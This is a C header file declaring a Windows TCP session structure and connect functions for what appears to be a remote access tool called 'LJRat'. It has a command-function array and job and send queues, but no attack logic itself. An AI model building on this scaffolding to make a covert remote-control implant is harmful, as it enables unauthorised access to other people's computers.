#ifndef SESSION_H
#define SESSION_H

#define WIN32_LEAN_AND_MEAN

#include <WinSock2.h>
#include <Windows.h>
#include "error_code.h"
#include "list.h"
#include "LJRat.h"

typedef struct _session_ctx {
    int gShutdown;
    SRW_LIST_HEAD job_list;
    SRW_LIST_HEAD send_list;
    HANDLE hJobWait;
    SOCKET sock;
    CMDFUNC pFuncArray[FUNCARRAYSIZE];
} SESSION_CTX, *PSESSION_CTX;

/*
@brief Function to initialize the type of session, currently only TCP is supported
@param pSession is a pointer to the session to be initialized
@param INT specifies the address family
@param INT specifies the type of socket
@param INT spcifies the protocol
@return ERROR_T with status of send
*/
ERROR_T SessionInit(PSESSION_CTX pSession, INT af, INT type, INT protocol);

/*
@brief Function to connect to the endpoint of a session
@param pSession is a pointer to the session to use to connect
@param SOCKADDR_IN of the address/port to connect to
@return ERROR_T with status of send
*/
ERROR_T SessionConnect(PSESSION_CTX pSession, SOCKADDR_IN *addr);

#endif // SESSION_H